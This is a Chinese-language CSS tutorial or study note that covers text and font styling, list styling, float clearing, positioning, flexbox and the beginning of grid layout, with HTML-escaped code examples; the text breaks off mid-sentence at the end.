div&#123;我是内容&#125; 生成有内容的div css: 使用属性首字母缩写+内容即可生成css代码，例如： ti2em即可生成text-indent:2em CSS书写顺序 建议遵循以下顺序书写： 布局定位属性display/position/float/clear/visibility/overflow（建议display第一个写，关系到盒子模式 自身属性width/height/margin/padding/border/background 文字书写color/font/text-decoration/text-align/vertical-align/white-space/break-word 其他属性（CSS3）content/cursor/border-radius/box-shadow/text-shadow/background:linear-gradient... 页面布局准则 通过测量确定页面的版心（可视区域，内容区域宽度） 页面布局第一准则：分析行模块以及每个行模块中的列模块。即多个块级元素纵向排列使用标准流，多个跨级元素横向排列使用浮动流 页面布局第二准则：一行中的列模块经常浮动布局，先确定每个列的大小，之后确定列的位置 制作HTML结构。先结构后样式 样式化文本 基本文本和字体样式 用于样式文本的CSS属性通常可以分为两类： 字体样式：用于字体的属性，会直接应用到文本中，比如： 字体 字体大小 字体粗细 是否倾斜 文本布局风格：作用于文本的间距以及其他布局功能的属性，比如： 行于字之间的空间 内容框中文本如何对齐 注意事项： 无法将文本中一部分选中或添加样式，如果想要这么做，需要使用或等标签将其包裹，或者使用伪元，比如::first-letter，::first-line或者::selection(当前光标双击选中的内容) 字体 颜色可以直接使用color属性设置，color属性设置的内容是元素的前景内容的颜色（前景通常是文本，但也包含一些其他东西），或者使用text-decoration属性放置在文本下方或上方的线 (underline overline)。 1234p &#123; color: red; text-decoration: underline overline #FF3028;&#125; 字体种类 css允许使用font-family属性设置字体，但浏览器只会将当前机器上可用的字体引用到元素上，如果指定字体不可用，则会使用默认字体替代。 123p &#123; font-family: arial;&#125; 所以诞生了一些可以毫无顾忌的使用的，可以应用到所有系统的字体，被称为网页安全字体: 字体名称 泛型 注意 Arial sans-serif 通常认为最佳做法还是添加 Helvetica 作为 Arial 的首选替代品，尽管它们的字体面几乎相同，但 Helvetica 被认为具有更好的形状，即使 Arial 更广泛地可用。 Courier New monospace 某些操作系统有一个 Courier New 字体的替代（可能较旧的）版本叫 Courier。使用 Courier New 作为 Courier 的首选替代方案，被认为是最佳做法。 Georgia serif Times New Roman serif 某些操作系统有一个 Times New Roman 字体的替代（可能较旧的）版本叫 Times。使用 Times 作为 Times New Roman 的首选替代方案，被认为是最佳做法。 Trebuchet MS sans-serif 您应该小心使用这种字体——它在移动操作系统上并不广泛。 Verdana sans-serif 备注： 在各种资源中，cssfontstack.com 网站维护了一个可用在 Windows 和 Mac 操作系统上使用的网页安全字体的列表，这可以帮助决策网站的安全性。 默认字体 CSS 定义了 5 个常用的字体名称： serif sans-serif monospace cursive fantasy 这些都是非常通用的，当使用这些通用名称时，使用的字体完全取决于每个浏览器，而且它们所运行的每个操作系统也会有所不同。 浏览器会尽力提供一个看上去合适的字体。 serif, sans-serif 和 monospace 是比较好预测的，默认的情况应该比较合理，另一方面，cursive 和 fantasy 是不太好预测的，建议使用的时候注意。 名称 定义 示例 serif 衬线字体，即有衬线的字体（衬线是指字体笔画尾端的小装饰，存在于某些印刷体字体中）。 sans-serif 无衬线字体。 monospace 等宽字体，指包含的全部字符的宽度相同的字体，通常在编辑代码时使用。 cursive 手写字体，对于英文字符而言通常具有顺滑的连接笔画以模拟手写效果。 fantasy 装饰字体。 字体栈 由于无法保证你想在你的网页上使用的字体的可用性，可以提供一个字体栈 (font stack) 123p &#123; font-family: &quot;Trebuchet MS&quot;, Verdana, sans-serif;&#125; 字体大小 字体可以取大多数上文提到的单位值，甚至百分比值，然而调整大小最常用的单位是： px：绝对单位，在任何情况下计算出来的像素值都一样 em：相对单位，1em等于当前元素的父元素上设置的字体大小，使用em会使得网站维护更简单 rem：相对单位，1rem等于HTML中根元素的字体大小，不支持IE8以下不支持 文本样式 CSS提供了4种常用属性来定义文本样子： font-style: 用来打开和关闭文本 italic (斜体)： normal: 将文本设置为普通字体 (将存在的斜体关闭) italic: 如果当前字体的斜体版本可用，那么文本设置为斜体版本；如果不可用，那么会利用 oblique 状态来模拟 italics。 oblique: 将文本设置为斜体字体的模拟版本，也就是将普通文本倾斜的样式应用到文本中。 font-weight: 设置文字的粗体大小。这里有很多值可选 (比如-light,-normal,-bold,-extrabold,-black, 等等), 不过事实上除了normal和bold以外，很少会用到，可取值如下： normal, bold: 普通或者加粗的字体粗细 lighter, bolder: 将当前元素的粗体设置为比其父元素粗体更细或更粗一点。100–900: 数值粗体值，如果需要，可提供比上述关键字更精细的粒度控制。 text-transform: 允许你设置要转换的字体。值包括： none: 防止任何转型。 uppercase: 将所有文本转为大写。 lowercase: 将所有文本转为小写。 capitalize: 转换所有单词让其首字母大写。 full-width: 将所有字形转换成全角，即固定宽度的正方形，类似于等宽字体，允许拉丁字符和亚洲语言字形（如中文，日文，韩文）对齐。 text-decoration: 设置/取消字体上的文本装饰 (你将主要使用此方法在设置链接时取消设置链接上的默认下划线。) 可用值为： none: 取消已经存在的任何文本装饰。 underline: 文本下划线。 overline: 文本上划线 line-through: 穿过文本的线。 注意到text-decoration可以一次接受多个值，如果想要同时添加多个装饰值，比如 1text-decoration: underline overline 同时注意text-decoration是一个缩写形式，它由text-decoration-line,text-decoration-style和text-decoration-color构成。可以使用这些属性值的组合来创建有趣的效果，比如 1text-decoration: line-through red wavy 文字阴影 可以使用text-shadow属性为文字添加阴影，最多需要4个值： 1text-shadow: 4px 4px 5px red; 每个属性的代表的含义如下： 阴影与原始文本的水平偏移，可以使用大多数的 CSS 单位 length and size units, 但是 px 是比较合适的。这个值必须指定。 阴影与原始文本的垂直偏移;效果基本上就像水平偏移，除了它向上/向下移动阴影，而不是左/右。这个值必须指定。 模糊半径 - 更高的值意味着阴影分散得更广泛。如果不包含此值，则默认为 0，这意味着没有模糊。可以使用大多数的 CSS 单位 length and size units. 阴影的基础颜色，可以使用大多数的 CSS 颜色单位 CSS color unit. 如果没有指定，默认为 black。 备注： 正偏移值可以向右移动阴影，但也可以使用负偏移值来左右移动阴影，例如 -1px -1px. 多种阴影 多影音可以使用逗号分隔： 1234text-shadow: -1px -1px 1px #aaa, 0px 4px 1px rgba(0,0,0,0.5), 4px 4px 5px rgba(0,0,0,0.7), 0px 0px 7px rgba(0,0,0,0.4); 文字布局 使用text-align属性可以控制文本如何和它所在的盒子内对其： left：左对齐 right：右对齐 center：居中对齐 justify：使文本展开，改变单词之间的间距，使所有文本行的宽度相同。如果需要使用这个值，则通常需要考虑 行高 使用line-height可以设置行高，可以接受大多数单位 length and size units 不过也可以设置一个无单位值作为乘数，使用无单位的值乘以fony-size来获得line-height。推荐的行高大约是1.5-2（双倍间距 行高种的数值表示 = 上间距 + 文本高度 + 下间距 当行高设置为和字体等高时，字体上下将不会存在空隙 行高 &gt; 字体高度时，行高 - 字体高度 / 2即为上间距和下间距的值 字母和单词间距 letter-spacing 和 word-spacing 属性允许设置文本中的字母与字母之间的间距、或是单词与单词之间的间距。 1234p::first-line &#123; letter-spacing: 2px; word-spacing: 4px;&#125; 其他一些属性值 Font样式： font-variant: 在小型大写字母和普通文本选项之间切换。 font-kerning: 开启或关闭字体间距选项。 font-feature-settings: 开启或关闭不同的 OpenType 字体特性。 font-variant-alternates: 控制给定的自定义字体的替代字形的使用。 font-variant-caps: 控制大写字母替代字形的使用。 font-variant-east-asian (en-US): 控制东亚文字替代字形的使用，像日语和汉语。 font-variant-ligatures: 控制文本中使用的连写和上下文形式。 font-variant-numeric: 控制数字，分式和序标的替代字形的使用。 font-variant-position: 控制位于上标或下标处，字号更小的替代字形的使用。 font-size-adjust: 独立于字体的实际大小尺寸，调整其可视大小尺寸。 font-stretch: 在给定字体的可选拉伸版本中切换。 text-underline-position: 指定下划线的排版位置，通过使用 text-decoration-line 属性的underline 值。 text-rendering: 尝试执行一些文本渲染优化。 文本布局样式 text-indent: 指定文本内容的第一行前面应该留出多少的水平空间。 text-overflow: 定义如何向用户表示存在被隐藏的溢出内容。 white-space: 定义如何处理元素内部的空白和换行。 word-break: 指定是否能在单词内部换行。 direction: 定义文本的方向 (这取决于语言，并且通常最好让 HTML 来处理这部分，因为它是和文本内容相关联的。) hyphens: 为支持的语言开启或关闭连字符。 line-break: 对东亚语言采用更强或更弱的换行规则。 text-align-last: 定义一个块或行的最后一行，恰好位于一个强制换行前时，如何对齐。 text-orientation: 定义行内文本的方向。 word-wrap: 指定浏览器是否可以在单词内换行以避免超出范围。 writing-mode: 定义文本行布局为水平还是垂直，以及后继文本流的方向。 Font简写 许多字体的属性可以通过font的方式简写，但需要按照以下顺序来写： font-style, font-variant, font-weight, font-stretch, font-size, line-height, and font-family. 其中只有font-size和font-family是必要的 1font: italic normal bold normal 3em/1.5 Helvetica, Arial, sans-serif; Web字体 Web字体是一种CSS特性，可以允许指定在访问时随网站一起下载的字体文件，使用一个@font-face块指定要下载的字体文件： 1234@font-face &#123; font-family: &quot;myFont&quot;; src: url(&quot;myFont.ttf&quot;);&#125; 然后可以使用@font-face种指定的字体种类名称将定制字体应用到页面上： 123html &#123; font-family: &quot;myFont&quot;, &quot;Bitstream Vera Serif&quot;, serif;&#125; 总结 字体属性 属性 表示 注意 font-size 字号 单位通常为px font-family 字体 按团队字体来 font-weight 字体粗细 加粗是700/bold不加粗是400/normal，无单位 font-style 字体样式 倾斜式italic不倾斜式normal font 字体连写 1. 有顺序。2. 字体字号不能同时出现 文本属性 属性 表示 注意 color 文本颜色 常用十六进制 text-align 文本对齐 可设置文字水平对齐方式 text-indent 文本缩进 首行缩进，通常缩进2字符为text-indent:2em text-decoration 文本修饰 添加下划线underline取消下划线none line-height 行高 控制行间距 列表 列表间距 123456789101112131415161718192021222324252627282930313233/* General styles */html &#123; font-family: Helvetica, Arial, sans-serif; font-size: 10px;&#125;h2 &#123; font-size: 2rem;&#125;ul,ol,dl,p &#123; font-size: 1.5rem;&#125;li, p &#123; line-height: 1.5;&#125;/* Description list styles */dd, dt &#123; line-height: 1.5;&#125;dt &#123; font-weight: bold;&#125;dd &#123; margin-bottom: 1.5rem;&#125; 首先设置网页根节点基准字体大小，以及字体样式 规则集2和3为标题设置相对字体大小，这样每个段落和列表都将拥有相同的字体大小和上下间距，有助于保持垂直间距一致 4号在段落在列表项目上设置相同的line-height，也有助于保持垂直间距一致 5-7用来描述列表，描述列表的术语和其描述上设置与段落和列表项相同的行高，以及margin-bottom为1.5rem 列表特定样式 下面三个属性可以在&lt;ul&gt;和&lt;ol&gt;元素上设置： list-style-type：设置用于列表的项目符号类型例如： 方形 圆形 数字 字母 罗马数字 list-style-position：设置在每个项目开始之前，项目符号是出现在列表内还是列表外 list-style-image：设置自定义图片作为项目开始符号 符号样式 例如大写罗马字： 123ol &#123; list-style-type: upper-roman;&#125; 项目符号位置 可以设为insiade让符号在列表以内 1234ol &#123; list-style-type: upper-roman; list-style-position: inside;&#125; 自定义图片 123ul &#123; list-style-image: url(star.svg);&#125; 然而，这个属性在控制项目符号的位置，大小等方面是有限的。最好使用background 系列属性，可以在 Styling boxes 模块中了解更多信息。 123456789101112ul &#123; padding-left: 2rem; list-style-type: none;&#125;ul li &#123; padding-left: 2rem; background-image: url(star.svg); background-position: 0 0; background-size: 1.6rem 1.6rem; background-repeat: no-repeat;&#125; 将ul种的paddintg-left从默认的40px修改为20px，然后在列表上设置相同的数值。目的是让背景图像不与列表文本重叠 将list-style-type设置为none，以便默认情况下不会显示项目符号 为每无须列表项插入项目符号，对应属性如下： background-image：充当项目符号的图片文件路径 background-position：图像位置0 0 表示左上角 background-size：图像大小 background-repeat：平铺方式，默认情况下是复制填充，因此需要禁用平铺 list-style 符号样式，符号图片以及符号位置可以用一个list-sytle来缩写，方式如下： 123ul &#123; list-style: square url(example.png) inside;&#125; 属性值可以任意顺序排列，你可以设置一个，两个或者三个值（该属性的默认值为 disc, none, outside），如果指定了 type 和 image，如果由于某种原因导致图像无法加载，则 type 将用作回退。 管理列表计数 可以通过star属性来控制开始数字： 123456&lt;ol start=&quot;4&quot;&gt; &lt;li&gt;Toast pitta, leave to cool, then slice down the edge.&lt;/li&gt; &lt;li&gt;Fry the halloumi in a shallow, non-stick pan, until browned on both sides.&lt;/li&gt; &lt;li&gt;Wash and chop the salad.&lt;/li&gt; &lt;li&gt;Fill pitta with salad, humous, and fried halloumi.&lt;/li&gt;&lt;/ol&gt; 还可以通过reversed属性将序号倒置 123456&lt;ol start=&quot;4&quot; reversed&gt; &lt;li&gt;Toast pitta, leave to cool, then slice down the edge.&lt;/li&gt; &lt;li&gt;Fry the halloumi in a shallow, non-stick pan, until browned on both sides.&lt;/li&gt; &lt;li&gt;Wash and chop the salad.&lt;/li&gt; &lt;li&gt;Fill pitta with salad, humous, and fried halloumi.&lt;/li&gt;&lt;/ol&gt; 并且还可以通过value属性设置自定义序号值 123456&lt;ol&gt; &lt;li value=&quot;2&quot;&gt;Toast pitta, leave to cool, then slice down the edge.&lt;/li&gt; &lt;li value=&quot;4&quot;&gt;Fry the halloumi in a shallow, non-stick pan, until browned on both sides.&lt;/li&gt; &lt;li value=&quot;6&quot;&gt;Wash and chop the salad.&lt;/li&gt; &lt;li value=&quot;8&quot;&gt;Fill pitta with salad, humous, and fried halloumi.&lt;/li&gt;&lt;/ol&gt; CSS精灵图 为了有效地减小服务器接收和发送请求的次数，提高页面的加载速度，出现了CSS精灵技术CSS sprites 即将服务器中很多小的图片整合为一张大的图片 精灵图的使用 精灵图技术主要针对背景图片使用，即把多个小背景图片整合到一张大的图片中 前端实现精灵图的切割是使用background-position属性 移动的距离就是目标图片的x和y坐标 字体图标 可以方便的修改颜色、尺寸，且放大不失真 轻量级 灵活性 兼容性——几乎支持所有浏览器 vertical-align属性 该属性用实现于行内元素或者行内块元素的垂直居中效果 值 描述 baseline 默认，元素放在父元素的基线上（即字母中的a,b等没有小尾巴的字符的底部 top 元素顶端与行中最高元素顶端对齐 middle 把元素放置在父元素中部 bottom 把元素的顶端与行中最低的元素的顶端对齐（即字母中的f,g等有小尾巴的字符的底部 文本溢出省略号 单行 12345678one-line-text &#123; /* 1. 先将文本强制单行显示 */ white-space: nowrap; /* 默认为normal，自动换行 */ /* 2. 溢文本出部分隐藏 */ overflow: hidden; /* 1. 超出部分使用省略号代替 */ text-overflow: ellipsis;&#125; 多行 多行文本显示有较大兼容性问题，目前只适用于WebKit浏览器或移动端 12345678910mul-line-text &#123; overflow: hidden; text-overflow: ellipsis; /* 弹性伸缩盒子模型显示 */ display: -webkit-box; /* 限制在一个块元素显示的文本的行数 */ -webkit-line-clamp: 2; /* 设置或检索伸缩盒对象的子元素的排列方式 */ -webkit-box-orient: vertical&#125; CSS初始化 为了消除浏览器自带的样式，网页的最开始应该进行CSS初始化： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273/* 清除盒子内外边距 */* &#123; margin: 0; padding: 0;&#125;/* 斜体文字不倾斜 */em,i &#123; font-style: normal;&#125;/* 去除列表前的小圆点 */li &#123; list-style: none;&#125;/* 处理图片 */img &#123; /* 照顾低版本浏览器中，如果图片外面包含了链接将会产生边框的问题 */ border: 0; /* 取消图片由于基线对齐而底侧有空白间隙的问题 */ vertical-align: middle&#125;/* 让鼠标经过button时鼠标变成小手 */button &#123; cursor: pointer;&#125;/* 链接颜色 */a &#123; color: #666; text-decoration: none&#125;a:hover &#123; color: red;&#125;/* 指定按钮以及输入子体 */button,input &#123; font-family: Microsoft YaHei;&#125;/* 指定body字体，颜色，行高 */body &#123; /* CSS3 文字抗锯齿效果 */ -webkit-font-smoothing: antialiased; background-color: #fff; font: 12px/1.5 Microsoft YaHei; color: #666&#125;/* 元素隐藏标准样式 */.hiden,.none &#123; display: none;&#125;/* 清除浮动样式 */.clearfix:after &#123; visibility: hidden; clear: both; display: block; content: &quot;.&quot;; height: 0;&#125;.clearfix &#123; *zoom: 1;&#125; CSS布局 在不对页面进行任何布局控制时，浏览器默认的HEML布局方式为正常布局流（normal flow） 下面这些属性的设置可能会覆盖默认的布局行为： display 应用float值 position属性 表格布局 多列布局 默认状态下： 一个块级元素的内容宽度其父元素的100% 块级元素高度与其内容高度一致 行级元素的height width与内容一致 块级元素按照基于其父元素的书写顺序的块流动方向放置 CSS传统网页布局 标准流（文档流） 浮动流 定位流 标准流 标准流即：标签按照规定好默认方式排列 即 块级元素独占一行，从上到下依次排列 行内元素从左到右顺序排列，碰到父元素边缘自动换行 标准流是最基本的网页布局方式 浮动流 浮动可以让多个块级元素在一行显示，于是得到网页布局流第一准测： 网页布局流第一准则：多个块级元素纵向排列使用标准流，多个跨级元素横向排列使用浮动流 浮动流使用float创建浮动框，将其移动到一边， 直到左侧边缘或右侧边缘触及包含块或另一浮动框的边缘 1234567891011121314151617181920&lt;style&gt; .left, .right &#123; float: left; width: 200px; height: 200px; background-color: red; &#125; .right &#123; float: right; &#125;&lt;/style&gt;&lt;body&gt; &lt;div class=&quot;left&quot;&gt; 啊左 &lt;/div&gt; &lt;div class=&quot;right&quot;&gt; 啊右 &lt;/div&gt;&lt;/body&gt; 浮动元素特性： 浮动元素会脱离标准流 脱离标准流的控制，移动到指定位置，俗称脱标 浮动的盒子不再保留原先的位置 如果多个盒子设置了浮动，则会按照属性值一行内显示并且顶端对齐排列 浮动元素具有行内块元素特性： 行内元素设置浮动后可以设置宽高 块级元素设置浮动后可以同行显示，且宽度变为默认等于内容宽度 浮动盒子直接没有margin，与行内元素同理 注意事项： 浮动流和标准流的父盒子搭配时：先用标准流的父元素排列上下位置，后内部子元素浮动排列左右位置 一个元素浮动，理论上其余兄弟元素也要浮动：浮动盒子只会影响浮动盒子之后的标准流，不会影响其前面的标准流 清除浮动 为什么要清除浮动？ 由于父级盒子在很多情况下，不方便给高度，但子盒子浮动又不占有位置，最后父级盒子高度为0时，就会影响下面的标准流盒子 清除浮动的本质是什么？ 本质是清除浮动元素造成的影响 如果父盒子本身有高度，就不需要清除浮动 清除浮动后，父级就会根据浮动的子盒子自动检测高度。父级有了高度，就不会影响下面的标准流 清除浮动的语法：clear 属性值 描述 clear:left 不允许左侧有浮动元素 clear:right 不允许右侧有浮动元素 clear:both 同时清除左右两侧浮动的影响 实际应用中几乎只用clear:both 清除浮动策略：闭合浮动，即将浮动元素限制在父元素内 清除浮动的四种方法： 额外标签法（隔墙法），W3C推荐 父级添加overflow 父级添加after伪元素 父级添加双伪元素 额外标签法（不常用 在最后一个浮动盒子的后面添加一个额外的标签，然后设置其clear:both： 123456789101112131415161718192021222324252627282930313233343536373839&lt;head&gt; &lt;style&gt; .footer &#123; height: 200px; background-color: black; &#125; .box &#123; width: 800px; border: 1px solid blue; margin: 0 auto; &#125; .one &#123; width: 300px; height: 200px; background-color: purple; &#125; .two &#123; width: 200px; height: 200px; background-color: red; &#125; .clear &#123; clear: both; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;one&quot;&gt; one &lt;/div&gt; &lt;div class=&quot;two&quot;&gt; two &lt;/div&gt; &lt;!-- 添加清除标签,这样box就能根据子盒子计算高度，且该标签必须是块级标签 --&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt;&lt;/div&gt;&lt;/body&gt; 优点：简单，书写方便 缺点：添加许多无意义的标签，结构化较差 注意 添加的标签必须是块级标签 父亲添加overflow 为父节点添加overflow属性，并将其值设为hidden、auto、scroll 123456789101112131415161718192021222324252627282930313233343536&lt;head&gt; &lt;style&gt; .footer &#123; height: 200px; background-color: black; &#125; .box &#123; /* 为浮动元素的父元素添加该属性清除浮动 */ overflow: hidden; width: 800px; border: 1px solid blue; margin: 0 auto; &#125; .one &#123; width: 300px; height: 200px; background-color: purple; &#125; .two &#123; width: 200px; height: 200px; background-color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;one&quot;&gt; one &lt;/div&gt; &lt;div class=&quot;two&quot;&gt; two &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt;&lt;/div&gt;&lt;/body&gt; 优点：代码简洁 缺店：无法显示溢出的部分 父亲添加:after伪元 :after是额外标签法的升级版，利用伪元代替额外添加的标签 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;head&gt; &lt;style&gt; .clearFix:after &#123; /* 使用after清除浮动 */ content: &quot;&quot;; display: block; height: 0; clear: both; visibility: hidden; &#125; .clearFix &#123; /* IE6, 7 清除浮动兼容 */ *zoom: 1; &#125; .footer &#123; height: 200px; background-color: black; &#125; .box &#123; width: 800px; border: 1px solid blue; margin: 0 auto; &#125; .one &#123; width: 300px; height: 200px; background-color: purple; &#125; .two &#123; width: 200px; height: 200px; background-color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box clearFix&quot;&gt; &lt;div class=&quot;one&quot;&gt; one &lt;/div&gt; &lt;div class=&quot;two&quot;&gt; two &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt;&lt;/div&gt;&lt;/body&gt; 优点：没有增加更多标签，解构更简单 缺点：需要对低版本浏览器做兼容 父亲添加双伪元素 同时给父元素添加:after和:before伪元素 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;head&gt; &lt;style&gt; .clearFix:after, .clearFox:before &#123; /* 使用after清除浮动 */ content: &quot;&quot;; display: table; &#125; .clearFix &#123; /* IE6, 7 清除浮动兼容 */ *zoom: 1; &#125; .footer &#123; height: 200px; background-color: black; &#125; .box &#123; width: 800px; border: 1px solid blue; margin: 0 auto; &#125; .one &#123; width: 300px; height: 200px; background-color: purple; &#125; .two &#123; width: 200px; height: 200px; background-color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box clearFix&quot;&gt; &lt;div class=&quot;one&quot;&gt; one &lt;/div&gt; &lt;div class=&quot;two&quot;&gt; two &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt;&lt;/div&gt;&lt;/body&gt; 优点：代码更简洁 缺点：需要兼容低版本浏览器 清除浮动总结 为什么要清除浮动 父亲没高度 子盒子浮动 影响了之后的布局，需要清除浮动造成的影响 清除浮动的方法： 方法 优点 缺点 额外标签法 通俗易懂，书写方便 添加无意义标签，结构化较差 父亲添加overflow 书写简单 导致父元素溢出隐藏 父亲添加:after伪元 不引入额外标签，结构语义化正确 需要做兼容 父亲添加双伪元 不引入额外标签，结构语义化正确 需要做兼容 定位流 定位流可以实现： 让盒子自由地在某个盒子内部移动，并压住某个盒子 固定在屏幕的某个位置，并压住某个盒子 定位 = 定位模式 + 边偏移 定位模式用与指定一个元素在文档中的定位方式 边便宜则决定了该元素的最终位置 定位模式 通过position属性来设置 值 语义 static 静态定位 relative 相对定位 absolute 绝对定位 fixed 固定定位 边偏移 用于定位盒子的最终位置，有四个属性 属性 示例 描述 top top:80px 顶端偏移量，定义元素相对于其父元素上边线的距离 bottom bottom:80px 底端偏移量，定义元素相对于其父元素下边线的距离 left left:80px 左侧偏移量，定义元素相对于其父元素左线的距离 right right:80px 右侧偏移量，定义元素相对于其父元素右边线的距离 static静态定位（了解 即默认定位，无定位 静态定位按照标准流拜访位置，没有边偏移 很少使用 realative相对定位（重要 元素移动时，相对于它原来的位置而定 相对定位的特点： 相对于自己原来的位置移动 原来在标准流的位置继续占有，后面的盒子仍然以标准流的方式对待它（不脱标，继续保留原有位置） 因此相对定位通常用来限制绝对定位 absolute绝对定位 元素移动时，相对于它祖先元素移动 绝对定位的特点： 如果祖先元素没有定位或没有祖先元素，则按照浏览器进行定位（Document文档） 如果祖先元素有定位（相对，绝对，固定定位），则以最近的有定位的祖先元素作为参考点移动 绝对定位不再占有原有的位置（脱标） 子绝父相 即子盒子如果使用绝对定位，那么父盒子使用相对定位 子盒子使用绝对定位不会占用空间，可以放在父盒子的任意位置，且不会影响其他兄弟盒子 父盒子需要加定位才能限制子盒子的显示范围 父盒子在布局时，需要占有位置，因此只能使用相对定位 即：父级需要占有位置，因此是相对定位，子盒子不需要占有位置，则是绝对定位 fixed固定定位 可以在浏览器页面滚动时仍然保持不变 固定定位的特点： 以浏览器可视窗口为参照点移动元素 跟父元素没关系 随着页面滚动而滚动 固定定位不占有原先位置（脱标） 此外固定定位还能根据版心进行定位： 设置固定定位的盒子left: 50%，移动到浏览器可视区（版心）的一半位置 设置固定定位的盒子margin-left: 版心宽度的一半 sticky粘性定位`` 粘性定位可以被认为是relative相对定位和fixed固定定位的混合 该定位可以实现，当盒子在可是窗口以内时，以相对定位的方式固定在页面中，不随页面滚动而滚动 但当盒子即将被可视窗遮盖时，变为固定定位固定在可视窗的某个位置 固定定位的特点： 以浏览器的可视窗口为参照无来移动元素（固定定位特点 粘性定位占有原先的位置（相对定位特点 必须添加top, bottom, left, right其中的一个才能生效 通常和页面滚动搭配使用，但兼容性很差，IE不支持，通常该效果可以使用JS实现 定位叠放顺序z-index z-index用于控制盒子的前后顺序 数值可以为正数、负数、0，默认为auto，数值越大，盒子越靠上 如果值相同，则按照书写顺序，后来者居上 数字不能加单位`` 只有定位流具有该属性 定位流总结 定位模式 是否脱标 移动位置 是否常用 static 否 不能使用边偏移 很少 realative 否 相对于自身原位置偏移 常用 absolute 是 相对于祖先元素偏移 常用 fixed 是 相对于浏览器可视区偏移 常用 sticky 否 相对于浏览器可视区偏移 当前很少 定位流的特殊性质 行内元素添加绝对或者固定定位，可以直接设置宽高 块级元素添加绝对或者固定定位，如果不设置宽度，默认为内容大小 脱标的盒子不会触发外边距塌陷（即外边距合并 绝对定位（固定定位）会完全压住盒子 需要注意的是与浮动流的区别： 浮动元素只会压住下面标准流的盒子，但不会压住下面标准流盒子里的文字（图片 原因是浮动最初的作用是为了实现文字环绕效果 但是绝对（固定）定位会压住下面标准流所有的内容 水平居中 标准流下，可以通过margin: 0 auto实现水平居中 定位流下，绝对定位使用left: 50%; margin-left: -宽度的一半 Flex弹性盒子 通过修改display属性来控制元素是否为弹性盒子 123section &#123; display:flex&#125; 当这只元素为flex盒子后，其子元素将变为flex项 flex模型 当元素表现为flex时，它沿着两个轴来布局： 主轴，沿着flex元素放置方向延伸的轴 交叉轴，垂直于flex元素放置方向的轴 设置了display:flex的父元素，被称为flex容器 在flex容器种的表选为弹性盒子的元素被称为flex项 换行 当子元素超出了其容器，可以通过限制宽高，后设置自动换行来解决： 在flex容器中设置 1flex-wrap: wrap 在flex项中设置限宽： 1flex: 200px; 来限制flex项的最小宽度为200px flex-flow缩写 flex-flow允许将flex-direction和flex-wrap缩写进去： 1flex-flow: row wrap; flex项的动态尺寸 对于每个flex项，可以设置flex属性来定义显示比例 123div &#123; flex: 1;&#125; 这是一个无单位的比例值，表示每个 flex 项沿主轴的可用空间大小。 如果三个元素均设为1，那么三个元素将以1:1:1的形式呈现，如果是1:2则第一个元素占1/3，第二个元素占2/3 此外还可以同时设置比例值和单位值： 1234567article &#123; flex: 1 200px;&#125;article:nth-of-type(3) &#123; flex: 2 200px;&#125; 这表示每个flex项将首先给出200px的可用空间，剩余的可用空间则按比例分配 flex缩写和全写 flex 是一个可以指定最多三个不同值的缩写属性： 第一个就是上面所讨论过的无单位比例。可以单独指定全写 flex-grow 属性的值。 第二个无单位比例——flex-shrink——一般用于溢出容器的 flex 项。这指定了从每个 flex 项中取出多少溢出量，以阻止它们溢出它们的容器。 第三个是上面讨论的最小值。可以单独指定全写 flex-basis 属性的值。 水平垂直对齐 如果想要flex容器中的元素垂直、水平方向吹则，可以使用下面的方式： 12345div &#123; display: flex; align-items: center; justify-content: space-around;&#125; 其中： align-items控制flex项在交叉轴上的位置 默认值为stretch，即所有flex项沿着交叉轴方向拉伸以填充父元素，如果交叉轴方向没有固定宽度，则所有flex项将变得与最长的flex项一样长 center会使得flex项保持原有高度，但会在交叉轴居中 flex-end，flex-star使flex项在交叉轴的开始或结束处对齐所有值。 对于需要单独控制的flex项，可以使用align-self来覆盖父元素的align-items 123button:first-child &#123; align-self: flex-end;&#125; justify-countent可以用来控制flex项在主轴上的位置 默认值为flex-start，让flex项位于主轴的开始处 flex-end，让flex项位于主轴的结尾处 center，让flex项在主轴居中 space-around，会使所有flex项沿着主轴均匀地分布，在任意一端都会留出一点空间。 space-between和space-around非常相似，只是它不会在两端留下空间 flex项排序 弹性盒子也有可以改变 flex 项的布局位置的功能，而不会影响到源顺序（即 dom 树里元素的顺序）。 123button:first-child &#123; order: 1;&#125; 所有 flex 项默认的 order 值是 0。 order 值大的 flex 项比 order 值小的在显示顺序中更靠后。 相同 order 值的 flex 项按源顺序显示。所以假如你有四个元素，其 order 值分别是 2，1，1 和 0，那么它们的显示顺序就分别是第四，第二，第三，和第一。 第三个元素显示在第二个后面是因为它们的 order 值一样，且第三个元素在源顺序中排在第二个后面。 也可以给 order 设置负值使它们比值为 0 的元素排得更前面。 Grid网格布局 网格是由一系列水平及垂直的线构成的一种布局模式。帮助我们设计一系列具有固定位置以及宽度的元素的页面，使我们的网站页面更加统一。 一个网格通常具有许多的列（column）与行（row），以及行与行、列与列之间的间隙，这个间隙一般被称为沟槽（gutter） 创建一个网格布局： 123.container &#123; display: grid;&#125; 在定义网格后，网页并不会马上发生变化。因为 display: grid 的声明只创建了一个只有一列的网格，所以子项还是会像正常布局流那样，自上而下、一个接一个的排布。 接着我们需要给更定义的网格加一些列： 1234.container &#123; display: grid; grid-template-columns: 200px 200px 200px;&#125; 上述代码加入了三个宽度为200px的列，此处可以使用任何长度单位 fr单位 除了长度和百分比，我们也可以用 fr 这个单位来灵活地定义网格的行与列的大小。这个单位代表网格容器中可用空间的一份。 1234.container &#123; display: grid; grid-template-columns: 1fr 1fr 1fr;&#125; fr 单位按比例划分了可用空间，类似flex布局中的flex 备注： 